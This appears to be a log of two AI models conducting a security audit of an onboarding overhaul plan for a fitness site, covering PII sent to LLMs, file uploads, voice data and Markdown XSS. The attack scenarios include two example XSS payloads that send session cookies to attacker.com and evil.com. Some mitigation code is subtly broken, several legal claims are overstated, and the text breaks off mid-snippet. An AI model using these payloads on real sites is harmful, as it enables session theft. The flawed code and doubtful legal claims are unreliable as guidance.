# Security Planning Analysis — Recursive Consensus Debate Log

> **Consensus:** YES — Models agreed
> **Rounds:** 2
> **Tokens:** 12,704 input / 5,018 output

---

## Primary Security Planner — Round 1

# SECURITY AUDIT REPORT: SWANSTUDIOS ONBOARDING OVERHAUL

**Auditor:** Primary Security Lead  
**Document:** `ONBOARDING-WORKFLOW-OVERHAUL-PLAN.md`  
**Production Environment:** sswanstudios.com  
**Audit Date:** 2025  
**Overall Risk Rating:** 🔴 **CRITICAL** (6 Critical, 4 High, 2 Medium findings)

---

## EXECUTIVE SUMMARY

The onboarding overhaul introduces **multiple systemic security failures** that violate zero-trust principles, PII handling policies, and regulatory compliance frameworks. The most severe issues involve **unprotected PII flows to external LLMs**, **uncontrolled file upload chains**, and **critical race conditions** in JSONB conversation storage. These are not implementation bugs—they are **architectural anti-patterns** that must be redesigned before any code is written.

**Immediate Action Required:** Halt all development on AI-driven client creation until the PII-to-LLM pipeline is either eliminated or secured with on-premise redaction.

---

## 1. PII EXPOSURE & LLM POLICY VIOLATIONS 🔴 CRITICAL

### Finding 1.1: Direct PII Transmission to External LLMs
**Severity:** CRITICAL  
**Plan Reference:** Section 3A ("AI-Driven Client Creation + Questionnaire Pre-Fill")

**Vulnerability:** The plan explicitly states the AI extracts `firstName`, `lastName`, `age`, `healthConcerns`, `fitnessGoal` from natural language and sends this raw PII to external providers (Gemini/Qwen). This violates the **ZERO PII TO LLMs** policy documented in your security requirements.

**Attack Scenario:**
1. Trainer types: "Onboard Sarah Miller, 34, knee surgery, wants weight loss"
2. This exact PII payload is transmitted to Google's Gemini API
3. Google's data retention policy (as of 2025) may store this for 18 months for model improvement
4. GDPR/CCPA violation: Personal data sent outside EU/US jurisdiction without explicit consent
5. HIPAA violation if "knee surgery" is considered PHI (it is—it's a health condition)

**Specific Mitigations:**

**Option A (Recommended): Eliminate AI Extraction Entirely**
```typescript
// Replace AI extraction with structured form
// In aiChatRoutes.mjs, BLOCK any create_client action from AI
// Instead, AI should respond: "I've started a new client profile. Please fill out this secure form."
// Frontend opens modal with pre-filled fields from AI's NON-PII analysis:
// - "Client wants to build muscle" → fitnessGoal = "Build muscle"
// - "Has knee issue" → healthConcerns = "Knee issue" (no specifics)
// Admin manually enters name/email/age in encrypted form fields
```

**Option B: On-Premise PII Redaction Pipeline**
```javascript
// backend/services/piiRedactionService.mjs
const spacy = require('spacy-nlp'); // Local NER model
const PII_PATTERNS = {
  EMAIL: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
  PHONE: /(\+\d{1,3}\s?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g,
  FULL_NAME: /\b([A-Z][a-z]+)\s+([A-Z][a-z]+)\b/g // Simplified
};

async function redactPII(text) {
  // 1. Run local NER to identify PII entities
  const doc = await spacy(text);
  let redacted = text;
  
  // 2. Replace with placeholders
  doc.entities.forEach(entity => {
    if (['PERSON', 'DATE', 'PHONE', 'EMAIL'].includes(entity.label)) {
      redacted = redacted.replace(entity.text, `[${entity.label}]`);
    }
  });
  
  // 3. Regex fallback for known patterns
  PII_PATTERNS.forEach((pattern, key) => {
    redacted = redacted.replace(pattern, `[${key}]`);
  });
  
  return redacted;
}

// In aiChatService.mjs, BEFORE calling external LLM:
const safePrompt = await redactPII(userMessage);
// Send safePrompt to LLM
// After response, map placeholders back to actual PII stored in encrypted DB fields
```

**Policy Enforcement:**
```javascript
// Add pre-flight check in aiChatRoutes.mjs
function validateNoPII(message) {
  const piiRegex = /(\S+@\S+|\d{3}-\d{3}-\d{4}|[A-Z][a-z]+\s+[A-Z][a-z]+)/;
  if (piiRegex.test(message)) {
    auditLog('PII_DETECTED_IN_AI_REQUEST', { userId, message });
    throw new Error('PII not allowed in AI requests. Use secure form instead.');
  }
}
```

### Finding 1.2: Health Data as PHI
**Severity:** CRITICAL  
**Plan Reference:** Stage 3 (Health) and Stage 6 (Training) of questionnaire

**Vulnerability:** The questionnaire collects "health concerns" and "training experience" which constitute Protected Health Information (PHI) under HIPAA if associated with an individual. Sending this to external LLMs without a Business Associate Agreement (BAA) with the AI provider is illegal.

**Mitigation:**
- **Do not send health data to external LLMs** under any circumstances
- Store health data in encrypted PostgreSQL columns (`pgcrypto`)
- Use on-premise rule-based extraction for health fields only:
```sql
-- Encrypt at rest
ALTER TABLE ClientOnboardingQuestionnaire 
  ADD COLUMN health_concerns_encrypted BYTEA,
  ADD COLUMN training_experience_encrypted BYTEA;
```
- Implement field-level encryption in Sequelize models using `sequelize-transparent-crypt`

---

## 2. FILE UPLOAD & STORAGE ATTACK VECTORS 🔴 CRITICAL

### Finding 2.1: Unvalidated R2 Uploads Leading to XSS
**Severity:** CRITICAL  
**Plan Reference:** "image uploads to R2 for AI analysis"

**Vulnerability:** The plan allows image uploads to Cloudflare R2 for AI analysis without:
- File type validation (SVG XSS, polyglot files)
- Content scanning for malware
- Size limits (DoS via huge files)
- Path traversal protection

**Attack Scenario:**
1. Attacker uploads `malicious.svg` containing:
```svg
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
2. AI analysis endpoint returns the image URL
3. Frontend renders this URL in `<img src={url}>` or worse, in a Markdown renderer
4. XSS executes, stealing admin session tokens

**Mitigations:**

**Backend Validation (before R2 upload):**
```javascript
// backend/middleware/fileValidation.mjs
const { createHash } = require('crypto');
const { Readable } = require('stream');

const ALLOWED_MIME_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

async function validateFileUpload(fileBuffer, originalName) {
  // 1. Check MIME type from buffer, not extension
  const fileType = await fileTypeFromBuffer(fileBuffer);
  if (!ALLOWED_MIME_TYPES.includes(fileType.mime)) {
    throw new Error('Invalid file type');
  }
  
  // 2. Scan for embedded scripts in images
  if (fileType.mime === 'image/svg+xml') {
    const content = fileBuffer.toString('utf8');
    if (/<script/i.test(content) || /onload/i.test(content)) {
      throw new Error('SVG contains executable code');
    }
    // Sanitize SVG
    const sanitized = sanitizeSvg(content);
    fileBuffer = Buffer.from(sanitized);
  }
  
  // 3. Check file size
  if (fileBuffer.length > MAX_FILE_SIZE) {
    throw new Error('File too large');
  }
  
  // 4. Generate virus scan (ClamAV)
  const scanResult = await clamav.scanBuffer(fileBuffer);
  if (scanResult.isInfected) {
    auditLog('MALWARE_DETECTED', { fileName: originalName, virus: scanResult.viruses });
    throw new Error('File contains malware');
  }
  
  return { buffer: fileBuffer, mime: fileType.mime };
}
```

**R2 Bucket Policies:**
```json
{
  "rules": [
    {
      "allowed": {
        "ops": ["Get", "Put"],
        "prefix": "ai-chat/",
        "auth": ["user-${user_id}"]
      },
      "deny": {
        "ops": ["Delete"],
        "prefix": "ai-chat/"
      }
    }
  ]
}
```

**Frontend Rendering Safety:**
```typescript
// Use Content Security Policy and sanitize URLs
const CSP = "default-src 'self'; img-src 'self' https://r2.sswanstudios.com; script-src 'self'";

// When displaying AI-analyzed images:
const SafeImage = ({ url }: { url: string }) => {
  const sanitizedUrl = useMemo(() => {
    // Ensure URL is from your R2 bucket
    if (!url.startsWith('https://r2.sswanstudios.com/ai-chat/')) {
      return '/placeholder-image.png';
    }
    return url;
  }, [url]);
  
  return <img src={sanitizedUrl} alt="Uploaded" crossOrigin="anonymous" />;
};
```

### Finding 2.2: R2 Orphaned Files on Conversation Delete
**Severity:** HIGH  
**Plan Reference:** "image uploads to R2 for AI analysis"

**Vulnerability:** When a conversation is deleted, the R2 files remain orphaned, leading to:
- Storage cost bloat
- Data remanence (PHI lingering in object storage)
- Potential access if bucket permissions are misconfigured

**Mitigation:**
```javascript
// In conversation deletion service
async function deleteConversationWithAttachments(conversationId) {
  // 1. Fetch all attachments from JSONB
  const conversation = await Conversation.findByPk(conversationId);
  const attachments = conversation.messages
    .flatMap(m => m.attachments || [])
    .map(a => a.url);
  
  // 2. Delete from R2 in parallel
  await Promise.allSettled(
    attachments.map(url => {
      const key = url.split('/').pop();
      return r2Bucket.delete({ key });
    })
  );
  
  // 3. Soft delete conversation (set deletedAt)
  conversation.deletedAt = new Date();
  await conversation.save();
  
  // 4. Audit log
  auditLog('CONVERSATION_DELETED_WITH_ATTACHMENTS', {
    conversationId,
    attachmentsCount: attachments.length,
    userId: conversation.userId
  });
}
```

---

## 3. VOICE DATA PRIVACY & SECURITY 🔴 CRITICAL

### Finding 3.1: Unprotected Voice Recording Storage
**Severity:** CRITICAL  
**Plan Reference:** "Voice-first AI coach" and "voice recording"

**Vulnerability:** Voice recordings contain biometric data (voiceprint) and potentially PHI. The plan does not address:
- Where voice blobs are stored (likely R2 or local state)
- Encryption at rest
- Retention policy
- User consent for biometric data collection
- Secure deletion

**Legal Risks:**
- Illinois BIPA: Biometric data requires explicit consent, retention schedule, and secure deletion
- GDPR: Voice is special category data requiring explicit opt-in
- CCPA: Voice recordings are personal information

**Mitigations:**

**Consent Flow:**
```typescript
// Before first voice recording
const VoiceConsentModal = () => {
  return (
    <Modal>
      <h3>Voice Recording Consent</h3>
      <p>We will record your voice to provide AI coaching. Voice data is:</p>
      <ul>
        <li>Encrypted end-to-end</li>
        <li>Stored for 30 days only</li>
        <li>Never used for biometric identification</li>
        <li>Deletable on request</li>
      </ul>
      <button onClick={() => consentGiven('voice')}>I Agree</button>
      <button onClick={() => useTextOnly()}>Use Text Only</button>
    </Modal>
  );
};
```

**Secure Storage:**
```javascript
// Store voice in encrypted R2 with short TTL
const encryptVoice = async (audioBuffer, key) => {
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: crypto.getRandomValues(new Uint8Array(12)) },
    key, // Derived from user's master key
    audioBuffer
  );
  
  await r2Bucket.put({
    key: `voice/${conversationId}/${Date.now()}.enc`,
    body: encrypted,
    metadata: {
      'x-amz-meta-ttl': '30d', // Auto-delete after 30 days
      'x-amz-meta-encryption': 'AES-GCM'
    }
  });
};
```

**Retention Policy Job:**
```javascript
// Daily cron job
async function purgeOldVoiceRecordings() {
  const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
  
  const oldFiles = await r2Bucket.list({
    prefix: 'voice/',
    include: ['metadata']
  });
  
  for (const file of oldFiles) {
    if (new Date(file.uploaded) < thirtyDaysAgo) {
      await r2Bucket.delete({ key: file.key });
      auditLog('VOICE_RECORDING_PURGED', { key: file.key });
    }
  }
}
```

---

## 4. XSS & MARKDOWN RENDERING VECTORS 🟡 HIGH

### Finding 4.1: Unsanitized AI-Generated Markdown
**Severity:** HIGH  
**Plan Reference:** "MarkdownRenderer" component and AI responses

**Vulnerability:** The AI will generate Markdown that includes:
- Inline HTML (`<script>`, `<iframe>`)
- JavaScript URLs (`[click](javascript:alert(1))`)
- Event handlers (`<img src=x onerror=stealCookies()>`)

**Attack Scenario:**
1. Attacker creates client with name: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
2. AI includes this in response: "Welcome, **<img src=x onerror=...>**!"
3. Markdown renderer executes the script

**Mitigations:**

**DOMPurify Integration:**
```typescript
// frontend/components/MarkdownRenderer.tsx
import DOMPurify from 'dompurify';
import { useMemo } from 'react';

const MarkdownRenderer = ({ content }: { content: string }) => {
  const sanitizedHtml = useMemo(() => {
    // 1. Convert Markdown to HTML (react-markdown)
    const rawHtml = markdownToHtml(content);
    
    // 2. Sanitize with strict config
    return DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'code', 'pre'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
      ALLOW_DATA_ATTR: false,
      KEEP_CONTENT: true, // Remove dangerous tags but keep content
      ADD_ATTR: ['target'] // Force all links to have target
    });
  }, [content]);

  return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
};
```

**Content Security Policy (CSP):**
```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-${random}'; 
  style

---

## Secondary Security Planner (120B MoE) — Round 2

CONSENSUS REACHED

---

